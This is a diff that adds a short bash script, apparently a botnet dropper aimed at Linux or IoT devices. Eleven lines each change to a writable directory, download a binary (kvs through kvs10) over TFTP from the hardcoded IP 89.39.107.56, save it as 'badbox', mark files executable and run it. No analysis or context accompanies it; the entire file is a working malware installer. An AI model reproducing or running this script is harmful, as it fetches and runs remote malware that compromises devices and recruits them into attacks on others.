@@ -1,0 +1,14 @@
+#!/bin/bash
+ulimit -n 1024
+cp /bin/busybox /tmp/
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.39.107.56 -c get kvs;cat kvs >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.39.107.56 -c get kvs1;cat kvs1 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.39.107.56 -c get kvs2;cat kvs2 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.39.107.56 -c get kvs3;cat kvs3 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.39.107.56 -c get kvs4;cat kvs4 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.39.107.56 -c get kvs5;cat kvs5 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.39.107.56 -c get kvs6;cat kvs6 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.39.107.56 -c get kvs7;cat kvs7 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.39.107.56 -c get kvs8;cat kvs8 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.39.107.56 -c get kvs9;cat kvs9 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.39.107.56 -c get kvs10;cat kvs10 >badbox;chmod +x *;./badbox
